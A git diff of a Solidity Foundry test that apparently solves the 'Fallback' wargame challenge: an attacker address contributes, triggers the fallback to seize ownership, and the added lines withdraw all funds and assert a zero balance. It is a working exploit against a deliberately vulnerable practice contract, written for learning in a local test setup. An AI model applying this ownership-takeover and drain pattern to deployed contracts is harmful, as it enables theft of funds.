@@ -59,11 +59,9 @@ contract FallbackTest is Test {
         assertEq(newContributionAttacker, 100000000000000);
         console.log("contribution attacker : ");
         console.log(newContributionAttacker);
-        vm.stopPrank();
 
         console.log(" ");
         console.log("====== STEP 3 ========");
-        vm.prank(ATTACKER);
         (bool sent, ) = address(fallbackContract).call{value: 1}("");
         assert(sent);
 
@@ -72,5 +70,12 @@ contract FallbackTest is Test {
         console.log("attacker address : ");
         console.log(address(ATTACKER));
         assertEq(fallbackContract.owner(), ATTACKER);
+
+        fallbackContract.withdraw();
+        uint contractBalance = address(fallbackContract).balance;
+        assertEq(contractBalance, 0);
+        console.log("contract balance : ");
+        console.log(contractBalance);
+        vm.stopPrank();
     }
 }
